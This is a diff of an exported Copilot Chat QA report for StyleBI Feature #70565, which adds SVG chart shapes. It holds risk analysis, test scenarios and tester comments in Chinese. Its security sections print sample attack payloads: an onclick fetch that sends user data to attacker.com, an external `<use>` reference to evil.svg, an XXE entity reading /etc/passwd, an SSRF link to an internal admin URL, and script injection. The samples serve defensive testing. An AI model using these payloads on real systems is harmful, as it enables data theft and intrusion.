@@ -1,1064 +1,514 @@
-# Copilot Chat Conversation Export: Feature #70565 SVG support analysis
+# Copilot Chat Conversation Export: StyleBI Feature #70565 测试分析报告
 
 **User:** @agilegao
-**Thread URL:** https://github.com/copilot/c/eb561397-c9ab-4281-8758-6e2b3b36bff5
+**Thread URL:** https://github.com/copilot/c/bce63498-958d-441c-9033-fd0424b20ef0
 
 ## @agilegao
 
 ## Copilot
 
+我来分析这个 StyleBI Feature #70565 的测试场景。
 
+首先，让我**验证输入信息的完整性**：  > **分析**：ok
 
-# StyleBI Feature #70565 分析报告
-## "Chart 支持 SVG 格式 Shape"
+✅ 知识库文档：`dashboard-chartshape-knowledge.md` - 完整  
+✅ Feature 需求：PDF文件（InetSoft Issue Tracking）- 完整  
+✅ PR 链接：https://github.com/inetsoft-technology/stylebi/pull/2777 - 完整  
+✅ PR 状态：已合并（merged）  
 
----
-
-## 📋 第一部分：需求分析（Requirement Analysis）
-
-### 1. 功能核心目标     **测试-分析**：ok
-
-**功能概述**：  
-扩展 StyleBI Chart 组件对自定义 Shape 的支持范围，添加 **SVG 格式**作为新的支持格式，与现有的 JPG、PNG、GIF 等光栅格式并行支持。
-
-**解决的用户问题**：
-- 目前用户只能使用光栅图形（JPG、PNG、GIF）作为 Chart 数据点标记
-- SVG 作为矢量格式，提供更好的缩放性和更小的文件体积
-- 用户无法使用 SVG 格式的企业品牌图标或自定义矢量图形
+**输入验证通过**。现在进行分析。
 
 ---
 
-### 2. Feature 类型  **测试-分析**：ok
+# 分析报告：Feature #70565 - Chart Shape SVG Support
 
-✅ **多类型特征**：
-- **UI 行为**：新增上传入口对 SVG 文件的支持
-- **数据处理**：SVG 文件的解析和存储
-- **渲染逻辑**：Chart 渲染引擎需要支持 SVG 矢量格式的渲染
-- **架构改进**：Shape 类型系统扩展
+## 第一部分：Requirement Summary（需求概要）  > **分析**：ok，简洁也覆盖全
 
----
+**核心目标**：
+- 扩展 Chart Shape 功能，在现有的 JPG / PNG / GIF 格式基础上，**新增 SVG 文件格式支持**
+- 使用户能够使用矢量图形（SVG）作为图表数据点的自定义标记
 
-### 3. 合理性分析
+**用户价值**：
+- SVG 格式具有可缩放、高清晰度的特点，相比位图格式（JPG/PNG）在放大时保持清晰度
+- 满足对图表可视化品质有较高要求的用户需求
 
-#### ✅ 需求合理性   **测试-分析**：ok
-
-| 维度 | 评估 | 说明 |
-|------|------|------|
-| **用户需求** | ✅ 合理 | SVG 作为现代 Web 标准，广泛应用于企业应用，用户需求真实存在 |
-| **产品一致性** | ✅ 合理 | Shape 功能已成熟，扩展格式支持符合产品演进方向 |
-| **技术可行性** | ✅ 合理 | 现代浏览器原生支持 SVG 渲染，技术实现相对直接 |
-| **优先级** | ⚠️ 需评估 | PDF 无 Issue Tracking 数据，但从用户频率推测优先级应该中等 |
-
-#### ⚠️ 可扩展性评估   **测试-分析**：确实补充了我们手工测试可能遗漏的点
-
-| 潜在遗漏 | 风险等级 | 说明 |
-|---------|---------|------|
-| **SVG 动画支持** | Medium | SVG 支持内嵌动画（CSS、JavaScript），是否需要禁用/限制？ | 
-| **SVG 脚本执行** | **High** | SVG 可包含 `<script>` 标签，存在 **XSS 安全风险** ⚠️ |  **测试-分析**：ai补充了手工遗漏点，这个部分需要测试验证
-| **SVG 响应式适配** | Medium | 不同尺寸的 Chart 点，SVG 的 viewBox 和缩放需要合理处理 |
-| **SVG 性能**（大量数据点） | Medium | 矢量渲染性能与光栅不同，大数据集合性能表现需验证 |
-| **SVG 导出兼容性** | Medium | Chart 导出（PDF/Image）时，SVG 如何处理（栅格化/嵌入）？ |
-
-#### ⚠️ 体验问题  **测试-分析**：确实补充了我们手工测试可能遗漏的点
-
-- **上传验证**：是否清晰提示用户上传 SVG 的安全限制？
-- **错误提示**：上传无效 SVG 时的错误提示是否友好？ 
-- **性能反馈**：大量 SVG Shape 数据加载时，是否有加载提示？
+**Feature 类型**：
+- **Data I/O + Rendering**（涉及文件格式支持和图表渲染）
 
 ---
 
-### 4. 影响范围预判
+## 第二部分：Implementation Change（变更分析）  >**分析**：ok，简洁也覆盖全
 
-#### 📊 涉及模块   **测试-分析**：可行，覆盖比较全
+基于 PR #2777 的描述和 PDF 信息：
 
-| 模块 | 影响程度 | 说明 |
-|------|---------|------|
-| **Chart Engine** | 🔴 **High** | 核心渲染逻辑需修改，支持 SVG DOM 元素而非仅 Image |
-| **Shape Repository** | 🔴 **High** | 存储层需支持 SVG 格式标识和管理 |
-| **Upload Handler** | 🟡 **Medium** | 上传验证逻辑扩展，需增加 SVG 类型检测 |
-| **Dashboard Editor** | 🟡 **Medium** | Shape 选择器 UI 需显示 SVG 预览 |
-| **Export Module** | 🟡 **Medium** | Chart 导出为 PDF/Image 时，SVG 处理方式（栅格化？保留矢量？） |
-| **Scheduler** | 🟢 **Low** | 如果 Scheduled Task 包含 Chart，需确保 SVG 能正确导出 |
-| **API** | 🟢 **Low** | 如果有 Chart API，可能需扩展 Shape 类型枚举 | 
-| **Performance/Caching** | 🟡 **Medium** | SVG DOM 内存占用 vs 光栅缓存，是否影响缓存策略 |  **测试-分析**：AI补充手工测试以遗漏，需要测试
+**核心变更**：
+- 在 Shape 上传和处理流程中新增 SVG 格式验证与存储支持
+- 修改 Chart Shape Editor，允许用户选择上传 SVG 文件
+- 扩展 Shape 渲染引擎，在图表中正确解析并渲染 SVG 图形
+- 存储层面支持 SVG 文件在系统内容仓库中的持久化
 
----
+**目标覆盖度**：
+✅ 完全覆盖 Feature 需求（已合并状态表明实现完成）
 
-### 5. 潜在风险分析  
+**行为变化对比表**：
 
-#### 🔴 高风险  **测试-分析**：可行，确实补充了我们手工测试可能遗漏的点
-
-| 风险类别 | 具体风险 | 影响 | 建议 |
-|---------|---------|------|------|
-| **安全风险** | SVG 内嵌 `<script>` 导致 XSS | 严重数据泄露 | **必须严格清理 SVG**，移除所有脚本 |     
-| **安全风险** | SVG 外部资源引用（`<image>` href、`<use>` xlink） | SSRF 攻击可能 | 验证 SVG 内所有 URI |
-| **渲染崩溃** | 复杂 SVG（大量 Path、嵌套组）在高频率数据点场景卡顿 | 用户体验差 | 需性能测试大数据集 | 
-| **导出兼容性** | SVG 在 PDF 导出时无法正确渲染 | 报表质量下降 | 验证所有导出路径 |
-
-#### 🟡 中风险  **测试-分析**：新增功能需要下个版本看兼容，浏览器兼容可保留，是否保留动画
-
-| 风险类别 | 具体风险 | 影响 | 建议 |
-|---------|---------|------|------|
-| **版本兼容性** | 旧版本 Dashboard 加载新 SVG Shape 失败 | 升级困难 | 需 Fallback 机制 |
-| **存储空间** | SVG 文本格式比光栅大，大量��传消耗存储 | 存储成本增加 | 考虑压缩/去重策略 |
-| **浏览器兼容性** | 特定 SVG 特性在旧浏览器不支持 | 跨浏览器渲染差异 | 文档明确 SVG 支持的浏览器版本 |
-| **动画/交互冲突** | SVG 内部 CSS 动画与 Chart 动画冲突 | 行为不可预测 | 文档明确限制 SVG 动画 |
-
-#### 🟢 低风险   **测试-分析**：可忽略
-
-| 风险类别 | 具体风险 | 影响 | 建议 |
-|---------|---------|------|------|
-| **国际化** | SVG 内嵌文字需支持多语言 | 本地化难度增加 | 建议用户避免在 SVG 嵌入文字 |
-| **权限隔离** | 全局 Shape vs 组织级 Shape，SVG 权限同步 | 权限泄露风险低 | 确保现有权限机制适用 |
+| Before Behavior | After Behavior | Risk Level |
+|---|---|---|
+| Shape 格式：JPG/PNG/GIF 仅 | Shape 格式：JPG/PNG/GIF/**SVG** | Medium |
+| 上传时文件类型限制：不接受 .svg | 上传时文件类型限制：**接受 .svg** | Medium |
+| SVG 渲染：不支持 | SVG 渲染：**支持** | High |
+| Shape 大小展示：位图固定分辨率 | Shape 大小展示：**矢量可无限缩放** | High |
+| 跨浏览器兼容性：位图渲染一致 | 跨浏览器兼容性：**SVG 渲染可能差异** | Medium |
 
 ---
 
-## 🔍 第二部分：实现分析（Implementation Analysis）
+## 第三部分：Risk Identification（风险识别）  >**分析**：ok，简洁也覆盖我们考虑有限的，但需要验证我们是否支持
 
-### 1. PR 实现内容总结  **测试-分析**：ok
-
-**PR 标题**：`Feature #70565, support svg in the chart Shape frame`
-
-**PR 描述**：  
-该 PR 为 Chart 组件的 Shape 管理系统添加 SVG 格式支持，使用户能够上传和使用 SVG 格式的自定义图形标记。
-
-#### 📝 实现覆盖范围  **测试-分析**：ok
-
-| 实现模块 | 变更内容 | 关键文件（推测） |
-|---------|---------|------------------|
-| **Shape 类型系统** | 扩展 Shape 格式枚举，添加 SVG 类型常量 | `ShapeFormat.java` 或类似 |
-| **上传验证** | 扩展文件类型检测，允许 `.svg` 扩展名 | `ShapeUploadValidator.java` |
-| **存储处理** | SVG 文件存储到 Portal Folder，与光栅格式同一位置 | `ShapeRepository.java` |
-| **渲染引擎** | Chart 渲染时，检测 Shape 格式，使用 SVG DOM 或 `<img src="data:image/svg+xml">` 加载 | `ChartShapeRenderer.java` |
-| **UI 显示** | Shape 选择器支持 SVG 缩略图预览 | Dashboard Editor/Chart Editor |
-| **导出处理** | Chart 导出时，处理 SVG Shape（栅格化或保留） | `ChartExporter.java` |
+| # | 风险点 | 风险类型 | 说明 |
+|---|---|---|---|
+| 1 | **SVG 恶意脚本注入** | **Security** | SVG 可内嵌 JavaScript，若未进行内容清理，可能导致 XSS 攻击 |
+| 2 | **SVG 文件大小无限制** | **Performance** | 未定义 SVG 文件大小限制，可能导致上传超大文件影响系统 |
+| 3 | **SVG 复杂渲染性能** | **Rendering** | 复杂 SVG（大量路径、滤镜、阴影）在图表中批量渲染时可能卡顿 |
+| 4 | **SVG 在导出场景的支持** | **Data Consistency** | 图表导出为 PDF/Image 时，SVG Shape 的渲染结果是否正确保留 |
+| 5 | **浏览器兼容性差异** | **Compatibility** | SVG 的渐变、滤镜等高级特性在不同浏览器中渲染结果可能不同 |
+| 6 | **存储和加载一致性** | **Data Consistency** | SVG 文件上传→存储→加载→显示全链路是否稳定 |
+| 7 | **与现有 Shape 的交互** | **Cross-Module** | 同一图表中混用 JPG/PNG 和 SVG Shape，是否存在冲突或渲染不一致 |
+| 8 | **Dashboard 过滤、钻取后 SVG 刷新** | **Functional** | 图表数据变化（过滤/钻取）后，SVG Shape 是否正确刷新或保持一致 |
+| 9 | **从低版本升级时的兼容性** | **Compatibility** | 低版本报表中的 Shape 在新版本中是否正确识别和加载 |
 
 ---
 
-### 2. 行为变化分析 **测试-分析**：low和Unknown可忽略
+## 第四部分：Test Design（测试策略设计） >**分析**：ok，易读也基本覆盖
 
-| 场景 | 修改前行为 | 修改后行为 | 潜在风险 | 严重度 |
-|------|---------|---------|---------|--------|
-| **上传 Shape** | 仅接受 JPG/PNG/GIF | 接受 JPG/PNG/GIF/**SVG** | ⚠️ 用户可能上传恶意 SVG | 🔴 High |  **测试-分析**：AI补充手工测试以遗漏，需要测试
-| **存储位置** | Portal Folder (光栅) | Portal Folder (含 SVG 文本) | ⚠️ 文本 SVG 体积大 | 🟡 Medium | 
-| **Chart 渲染** | `<img src="...jpg">` | `<img src="...svg">` 或 `<svg>` 内联 | ⚠️ 渲染路径差异 | 🟡 Medium |
-| **缩放显示** | 光栅缩放有损 | SVG 矢量无损 | ✅ 正向改进 | 🟢 Low |
-| **导出 PDF** | 光栅 Shape 栅格化 | SVG Shape 如何处理？ | ❓ **未明确** | 🟠 Unknown |
-| **导出 Image** | 光栅 Shape 直接嵌入 | SVG Shape 如何处理？ | ❓ **未明确** | 🟠 Unknown |
-| **性能** | N 个光栅 Shape → N 个图片请求或缓存 | N 个 SVG Shape → N 个 DOM/Text 对象 | ⚠️ 大数据集性能差 | 🟡 Medium |
+**核心验证点**：
+1. SVG 文件能否正确上传、存储、加载、渲染到图表中
+2. SVG 与位图格式混用时的行为一致性
+3. SVG 内容安全性（防止恶意脚本）
+4. 图表常见操作（过滤、钻取、导出）对 SVG Shape 的影响
+5. 不同浏览器下 SVG 的渲染一致性
 
----
+**高风险路径**：
+- Path 1：**SVG 文件上传 → Shape 库存储 → 图表编辑器选用 → 图表渲染** 
+- Path 2：**图表数据变化（过滤/钻取）→ SVG Shape 动态刷新**
+- Path 3：**图表导出（PDF/Image/Excel）→ SVG Shape 导出结果**
+- Path 4：**SVG 文件大小、复杂度极限情况 → 系统稳定性**
+- Path 5：**恶意 SVG（含脚本） → 安全防护**
 
-### 3. 覆盖度分析
+**波及模块**：
+- ✅ Chart Module（核心受影响）
+- ✅ Dashboard / Worksheet（Shape 使用场景）
+- ✅ Export Module（PDF/Image/Excel导出）
+- ✅ Content Repository（文件存储）
+- ✅ Admin / Settings（Shape 管理）
+- ✅ Security / Auth（权限和安全）
 
-#### ✅ 完全覆盖的 Feature 需求
-
-```
-✓ 新增 SVG 格式上传支持
-✓ SVG 存储到 Portal Folder
-✓ Chart 渲染时加载 SVG Shape
-✓ Dashboard Editor / Chart Editor 支持 SVG 选择
-```
-
-#### ⚠️ 部分覆盖 / 未明确的需求       **测试-分析**：需要根据bug改动看是否支持
-
-| 需求项 | 覆盖状态 | 说明 |
-|-------|---------|------|
-| **SVG 安全清理** | ❓ **未确认** | PR 是否实现了 SVG 脚本清理？ |
-| **SVG 性能测试** | ❓ **未确认** | 大量 SVG 数据点渲染性能？ |
-| **导出兼容性** | ❓ **未确认** | PDF/Image 导出如何处理 SVG？ |
-| **浏览器兼容性** | ❓ **未确认** | 是否有兼容性检测？ |
-| **错误处理** | ❓ **未确认** | 上传无效 SVG 的错误提示？ |
-| **文档更新** | ❓ **未确认** | 用户文档是否说明 SVG 支持和限制？ |
-
-#### ❌ 可能存在的偏离
-
-**从 Knowledge 文档看**，原 Shape 支持格式为：
-```
-- JPG
-- PNG
-- gif
-- Extract archive files
-```
-
-**Knowledge 未提及 SVG**，这可能意味着：
-- 新增 SVG 是合理的功能扩展
-- 或者 Knowledge 文档已过期，需要更新
+**专项检查**：
+- **脚本兼容性**：若 UI 中有 Script 逻辑依赖 Shape 类型判断（如 `if shape.format == 'PNG'`），需验证是否需要扩展支持 'SVG'
+- **向后兼容**：已发布报表中的 JPG/PNG Shape 在新版本中是否仍正常显示
+- **文档一致性**：Shape 支持格式的官方文档是否已更新
 
 ---
 
-### 4. 技术风险分析
+## 第五部分：Key Test Scenarios（核心测试场景）
 
-#### 🔴 关键技术风险
+### **Scenario 1：SVG 文件基础上传和渲染**   >**分析**：ok，比较详细，步骤也比较详细
 
-**1. SVG 安全性 - XSS 漏洞**      **测试-分析**：AI补充手工测试以遗漏，需要验证是否可行
+**Scenario Objective**：
+验证标准 SVG 文件能否完整地上传到系统、存储并在图表中正确渲染。
 
-```
-风险：SVG 可包含 <script> 标签或事件处理器   **测试-容易遗漏**：需要全面覆盖
-示例：
+**Risk Level**：
+🔴 **High** - 这是 Feature 的基础功能，任何破缺都会导致功能不可用
+
+**Scenario Description**：
+在 Dashboard 中的 Point Chart 图表编辑器内，上传一个标准 SVG 文件作为 Shape，验证文件是否被正确保存和应用到数据点。
+
+**Pre-condition**：
+- 用户已登录
+- Dashboard 已创建
+- Point Chart 已配置并有数据绑定
+- 准备标准 SVG 文件（例如 star.svg，尺寸 50×50px）
+
+**Key Steps**：
+1. 打开 Dashboard → 选择 Point Chart → 右键选择 "Edit Shape" 或进入 Chart Editor
+2. 在 Shape Editor 中选择 "Add Shape" 或上传功能
+3. 选择本地 SVG 文件（star.svg）并上传
+4. 验证上传进度和成功提示
+5. 确认 SVG 显示在 Shape 库列表中
+6. 在图表中应用该 SVG Shape
+7. 保存图表并刷新 Dashboard
+8. 验证数据点上展示的是 SVG 图形（非损坏图标）
+
+**Expected Result**：
+- ✅ SVG 文件上传成功，无错误提示
+- ✅ Shape 库中显示该 SVG，文件信息完整（名称、大小、预览缩略图）
+- ✅ 图表中数据点显示为 SVG 渲染的矢量图形，清晰可见
+- ✅ 刷新后 SVG 仍正确显示，无加载延迟或闪烁
+
+**Risk Covered**：
+- ✅ SVG 格式支持（核心功能）
+- ✅ 文件上传流程
+- ✅ 存储持久化
+- ✅ 基础渲染
+
+📅 报了Bug #74031：upload some svg image, show empty
+
+---
+
+### **Scenario 2：SVG 安全性 - 恶意脚本检测**  >**分析**：我们之前测试方式很容易忽略的，需执行验证
+
+**Scenario Objective**：
+验证系统能否检测和防止含有 JavaScript 脚本的恶意 SVG 文件上传，防止 XSS 攻击。
+
+**Risk Level**：
+🔴 **High** - 安全风险，可能导致数据泄露或用户会话劫持
+
+**Scenario Description**：
+尝试上传一个含有内嵌 JavaScript 代码的 SVG 文件，验证系统的防护机制。
+
+**Pre-condition**：
+- 用户已登录（拥有 Shape 上传权限）
+- 准备恶意 SVG 文件，例如：
+```xml
 <svg>
-  <script>alert('XSS')</script>
-</svg>
-
-<svg>
-  <rect onclick="fetch('https://attacker.com/steal?data=' + userData)"></rect>
+  <script>alert('XSS Attack');</script>
+  <circle cx="50" cy="50" r="40" fill="red"/>
 </svg>
 ```
 
-**期望实现**：
-- ✅ 上传时严格验证 SVG，移除所有 `<script>` 标签
-- ✅ 移除所有事件处理器（onclick, onload 等）
-- ✅ 白名单允许的 SVG 标签（path, circle, rect, g, text 等）
-- ✅ 存储和加载时再次验证
+**Key Steps**：
+1. 进入 Dashboard → Chart Editor → Shape Upload
+2. 尝试上传包含脚本的 SVG 文件
+3. 观察系统响应
 
-**当前状态**：PR 代码未公开，无法确认是否实现
+**Expected Result**：
+- ✅ 系统拒绝上传，显示明确的安全警告（如"SVG 文件包含不安全内容"）
+- ✅ 或者系统接受上传但自动清理 SVG 中的脚本标签
+- ✅ 图表中渲染的 SVG 不执行任何 JavaScript，仅显示图形部分
+- ✅ 无 XSS 弹窗或其他恶意行为
 
----
-
-**2. SVG SSRF 漏洞**   **测试-分析**：AI补充了手工测试遗漏点，需要验证是否可行
-
-```
-风险：SVG 内部 <image> 或 <use> 标签可引用外部 URL
-示例：
-<svg>
-  <image href="http://internal-server:8080/admin"></image>
-</svg>
-```
-
-**期望实现**：
-- ✅ 禁止外部 URL 引用，或白名单允许的协议
-- ✅ 验证 SVG 内所有 href/xlink:href 属性
+**Risk Covered**：
+- ✅ SVG 恶意脚本注入风险
+- ✅ 系统安全防护
 
 ---
 
-**3. 渲染性能**
+### **Scenario 3：SVG 与位图混用 - 渲染一致性**    >**分析**：覆盖到chart结构还不错
 
-```
-风险：复杂 SVG 在大数据集场景卡顿
-场景：1000+ 数据点的散点图，每个点显示复杂 SVG（多 Path、嵌套 Group）
-```
+**Scenario Objective**：
+验证同一图表中同时使用 SVG 和 PNG/JPG Shape 时，渲染结果的一致性和稳定性。
 
-**期望实现**：
-- ✅ SVG 虚拟化渲染（ViewPort 外不渲染）
-- ✅ SVG 缓存策略（避免重复解析）
-- ✅ 性能基准测试（如：1000 点需 <2s）
+**Risk Level**：
+🟠 **Medium** - 混合场景下的边界情况，可能导致渲染不一致
 
----
+**Scenario Description**：
+在单个 Point Chart 中，将部分数据点设为 SVG Shape，另一部分设为 PNG Shape，验证两种格式的协同渲染。
 
-**4. 导出兼容性**   **测试-分析**：ok
+**Pre-condition**：
+- Dashboard 和 Point Chart 已配置
+- 有多个数据维度/分组字段
+- 已上传 SVG 文件和 PNG 文件
 
-```
-风险：SVG Shape 导出为 PDF/Image 时可能失败或显示异常
-```
+**Key Steps**：
+1. 在 Chart Editor 中编辑 Shape Mapping 规则：
+   - 数据维度 A（如 Category='Type1'）→ 使用 SVG Shape
+   - 数据维度 B（如 Category='Type2'）→ 使用 PNG Shape
+2. 保存图表并刷新
+3. 验证图表中不同类别的数据点
+4. 调整图表缩放（放大/缩小）
+5. 验证两种 Shape 的显示效果
 
-**期望实现**：
-- ✅ 定义导出行为（栅格化 SVG？保留 SVG？）
-- ✅ 验证所有导出路径
-- ✅ 文档明确说明限制
+**Expected Result**：
+- ✅ SVG 和 PNG Shape 都正确显示，无混乱或重叠
+- ✅ 放大时 SVG 保持清晰，PNG 可能出现像素化（符合预期）
+- ✅ 图表性能正常，无卡顿或加载延迟
 
----
-
-#### 🟡 扩展性风险    **测试-分析**： 可保留浏览器差异
-
-| 风险 | 说明 | 建议 |
-|------|------|------|
-| **格式版本** | SVG 规范版本差异 | 是否支持 SVG 1.1 及更新版本？ |
-| **浏览器差异** | 不同浏览器 SVG 支持差异 | 需兼容性矩阵 |
-| **内存占用** | SVG DOM Tree vs 光栅缓存 | 大规模上传时监控内存 |
-
----
-
-## 🏗️ 第三部分：测试架构设计（Test Architecture）
-
-### 1. Feature 功能理解与高风险路径识别
-
-#### 📌 核心功能   **测试-执行**：可行，报了 Bug #74029,  Bug #74029
-
-| 功能路径 | 描述 | 风险等级 |
-|---------|------|---------|
-| **F1: SVG 上传** | 用户在 Dashboard/Chart Editor 上传 `.svg` 文件 | 🔴 **High** |
-| **F2: SVG 验证** | 系统验证 SVG 格式、安全性、兼容性 | 🔴 **High** |
-| **F3: SVG 存储** | SVG 保存到 Portal Folder | 🟡 **Medium** |
-| **F4: SVG 渲染** | Chart 加载并渲染 SVG Shape | 🟡 **Medium** |
-| **F5: SVG 导出** | Chart 导出时处理 SVG Shape | 🟡 **Medium** |
-| **F6: SVG 性能** | 大量 SVG 数据点渲染性能 | 🟡 **Medium** |
-
-#### 🔴 高风险路径（必须覆盖）
-
-```
-路径 1: 恶意 SVG 上传 → 存储 → 渲染 → XSS 执行
-  → 威胁：数据泄露、会话劫持
-  → 检查点：上传验证、存储内容、前端渲染
-
-路径 2: SVG 引用外部资源 → SSRF 探测内部网络
-  → 威胁：内部服务暴露
-  → 检查点：SVG URL 白名单验证
-
-路径 3: 大量 SVG 数据点 → 渲染卡顿 → 用户无法交互
-  → 威胁：DoS 风险
-  → 检查点：性能基准测试
-
-路径 4: SVG 导出 PDF → 失败 → 用户无法生成报告
-  → 威胁：功能不可用
-  → 检查点：所有导出路径验证
-
-路径 5: 旧版本 Dashboard 加载新 SVG Shape → 兼容性破裂
-  → 威胁：升级失败
-  → 检查点：版本兼容性、Fallback 机制
-```
+**Risk Covered**：
+- ✅ 混合格式渲染一致性
+- ✅ 渲染性能
 
 ---
 
-### 2. 测试策略
+### **Scenario 4：SVG 大小极限 - 文件上传限制**   >**分析**：ok
 
-#### 📊 测试矩阵  **测试-执行**：可行，识别到了知识库
+**Scenario Objective**：
+验证系统对 SVG 文件大小的限制，防止超大文件上传导致系统资源耗尽。
 
-| 测试维度 | 测试内容 | 风险级别 | 优先级 | 动机 |
-|---------|---------|---------|--------|------|
-| **安全验证** | SVG 脚本清理、XSS 防护、SSRF 防护 | 🔴 High | P0 | 防止数据泄露、会话劫持 |
-| **���式验证** | SVG 格式合法性、文件类型检测、Magic Number 验证 | 🔴 High | P0 | 防止非 SVG 文件上传 |
-| **渲染测试** | SVG 在 Chart 中正确显示、颜色/大小调整、缩放无失真 | 🟡 Medium | P1 | 确保用户体验 |
-| **导出测试** | 包含 SVG Shape 的 Chart 导出为 PDF/PNG/Image | 🟡 Medium | P1 | 确保报表可用性 |
-| **性能测试** | 1000+ 数据点 SVG 渲染、内存占用、加载时间 | 🟡 Medium | P1 | 避免 DoS 和卡顿 |
-| **兼容性测试** | 浏览器兼容性、版本升级兼容性、SVG 规范支持 | 🟡 Medium | P2 | 确保跨平台可用 |
-| **功能集成** | SVG + Filter/Drill/Export 组合、多 Chart 并行加载 | 🟡 Medium | P2 | 确保与现有功能协调 |
-| **边界条件** | 超大 SVG 文件、空 SVG、损坏 SVG、递归 Use 标签 | 🟢 Low | P2 | 提高鲁棒性 |
-| **错误处理** | 上传失败提示、渲染失败降级、导出失败处理 | 🟢 Low | P2 | 改善用户体验 |
+**Risk Level**：
+🟠 **Medium** - 资源消耗风险
 
----
+**Scenario Description**：
+尝试上传不同大小的 SVG 文件，包括极限情况。
 
-#### 🔒 安全性测试策略（详细）   **测试-执行**：先报了两个bug，如果不处理后期可忽略Bug #74029，Bug #74031
+**Pre-condition**：
+- 已知系统的 SVG 文件大小限制（从配置或文档中获取，假设为 10MB）
+- 准备不同大小的 SVG 文件：
+  - 正常：100KB
+  - 中等：5MB
+  - 超限：20MB
 
-**动机**：SVG 是文本格式，可包含恶意代码，必须严格验证
+**Key Steps**：
+1. 依次尝试上传各大小的 SVG 文件
+2. 记录上传结果和系统反应时间
+3. 若上传成功，验证图表中的渲染时间和内存占用
 
-**测试清单**：
+**Expected Result**：
+- ✅ 小于限制的 SVG 正常上传
+- ✅ 超过限制的 SVG 被拒绝，显示错误提示（如"文件过大，请选择小于 10MB 的文件"）
+- ✅ 系统内存和 CPU 占用在正常范围内，无明显峰值
 
-1. **XSS - 脚本注入**
-   - ✅ 上传包含 `<script>` 的 SVG
-   - ✅ 上传包含事件处理器（onclick, onerror, onload）的 SVG
-   - ✅ 上传包含 `<style>` 带 JavaScript 的 SVG
-   - ✅ 验证上传被拒绝或脚本被清理
-
-2. **SSRF - URL 注入**
-   - ✅ 上传包含 `<image href="http://localhost:8080/admin">` 的 SVG
-   - ✅ 上传包含 `<use xlink:href="http://attacker.com/evil.svg#payload">` 的 SVG
-   - ✅ 验证外部 URL 被移除或被拒绝
-
-3. **XXE - XML 外部实体**
-   - ✅ 上传包含 DOCTYPE 和外部实体的 SVG（如：`<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`）
-   - ✅ 验证 XXE 防护
-
-4. **文件类型欺骗**
-   - ✅ 上传 `.jpg` 文件但声称是 SVG
-   - ✅ 上传非 SVG XML 但扩展名为 `.svg`
-   - ✅ 验证 MIME Type 和 Magic Number 检查
+**Risk Covered**：
+- ✅ SVG 文件大小无限制风险
+- ✅ 系统性能和稳定性
 
 ---
 
-#### 🎨 渲染测试策略  **测试-执行**：可行，拿到了知识库。报了Bug #74034
+### **Scenario 5：SVG 在图表导出中的表现**   >**分析**：覆盖了导出
 
-**动机**：确保 SVG 在不同尺寸和颜色配置下正确显示
+**Scenario Objective**：
+验证包含 SVG Shape 的图表在导出为不同格式（PDF、PNG、Excel）时，SVG 是否被正确处理。
 
-**测试清单**：
+**Risk Level**：
+🟠 **Medium** - 导出是常见功能，任何破缺会影响用户体验
 
-1. **基础渲染**
-   - ✅ 简单 SVG（单个 `<circle>`）正确显示
-   - ✅ 复杂 SVG（多层 `<g>` 和 `<path>`）正确显示
-   - ✅ 带渐变和图案的 SVG 正确显示
+**Scenario Description**：
+创建包含 SVG Shape 的图表，分别导出为 PDF、PNG、Excel，验证 SVG 在各种格式中的呈现。
 
-2. **尺寸适配**
-   - ✅ Chart 点尺寸改变，SVG 缩放正确
-   - ✅ Chart 尺寸改变（响应式），SVG 自适应
-   - ✅ SVG 无锯齿失真（矢量优势）
+**Pre-condition**：
+- Dashboard 中存在使用 SVG Shape 的 Point Chart
+- 图表有样本数据
 
-3. **颜色适配**
-   - ✅ Chart 主题颜色改变，SVG 填充/笔画颜色跟随（如果支持动态着色）
-   - ✅ Chart 深色/浅色主题，SVG 可见性正确
+**Key Steps**：
+1. 在 Dashboard 中右键选择图表 → "Export"
+2. 选择导出格式：PDF
+3. 完成导出并打开 PDF 文件
+4. 验证 SVG Shape 在 PDF 中的显示
+5. 重复步骤 2-4，分别测试 PNG 导出和 Excel 导出
 
-4. **动画限制**
-   - ✅ SVG 内嵌 CSS 动画不应播放（防止分心）
-   - ✅ 文档明确说明 SVG 动画限制
+**Expected Result**：
+- ✅ PDF 导出：SVG 正确渲染为矢量或位图，清晰可见
+- ✅ PNG 导出：SVG 被正确栅格化为位图，质量良好
+- ✅ Excel 导出：图表作为图像嵌入，SVG Shape 正确显示
+- ✅ 导出文件大小在预期范围内
 
----
-
-#### 📤 导出测试策略  **测试-执行**：可行
-
-**动机**：导出是高价值场景，SVG 导出失败会影响报表生成
-
-**测试清单**：
-
-1. **PDF 导出**
-   - ✅ Chart（含 SVG Shape）导出为 PDF，SVG 正确显示（栅格化）
-   - ✅ 多个 SVG Shape，导出后都正确显示
-   - ✅ 验证 PDF 文件大小合理（不应无限增长）
-
-2. **Image 导出**
-   - ✅ Chart（含 SVG Shape）导出为 PNG/JPG，SVG 正确栅格化
-   - ✅ 导出图片分辨率足够（不应模糊）
-
-3. **Excel 导出**（如果支持）
-   - ✅ 导出 Excel 时 SVG 处理方式（栅格化/链接）
-
-4. **失败降级**
-   - ✅ SVG 栅格化失败时的错误处理
-   - ✅ 验证用户收到清晰的错误提示
+**Risk Covered**：
+- ✅ SVG 在导出场景的支持（跨功能模块）
+- ✅ 数据一致性
 
 ---
 
-#### ⚡ 性能测试策略  **测试-执行**：过于详细，可简化
+### **Scenario 6：图表过滤/钻取后 SVG 动态刷新**   >**分析**：覆盖了关联模块
 
-**动机**：SVG 渲染性能直接影响用户体验，大数据集风险
+**Scenario Objective**：
+验证当图表数据因用户过滤或钻取操作而变化时，SVG Shape 是否正确刷新和更新。
 
-**测试清单**：
+**Risk Level**：
+🟠 **Medium** - 常见用户交互，破缺会导致数据和视觉不同步
 
-1. **渲染性能基准**
-   - ✅ 100 个数据点 SVG → 加载时间 < 200ms
-   - ✅ 500 个数据点 SVG → 加载时间 < 1s
-   - ✅ 1000 个数据点 SVG → 加载时间 < 2s（或定义基准）
-   - ✅ 5000 个数据点 SVG → 是否应用虚拟化？
+**Scenario Description**：
+在 Dashboard 中对使用 SVG Shape 的图表应用过滤器或执行钻取操作，验证数据和 Shape 的同步更新。
 
-2. **内存占用**
-   - ✅ 1000 个 SVG 数据点的内存占用 vs 光栅版本
-   - ✅ 验证内存不应无限增长
+**Pre-condition**：
+- Dashboard 中存在使用 SVG Shape 的 Point Chart
+- Chart 配置了过滤器或支持钻取
+- 图表有多个数据维度
 
-3. **交互延迟**
-   - ✅ 大数据集 SVG Chart 中，鼠标悬停 Tooltip 响应延迟 < 100ms
-   - ✅ 缩放、拖拽操作流畅（帧率 > 30fps）
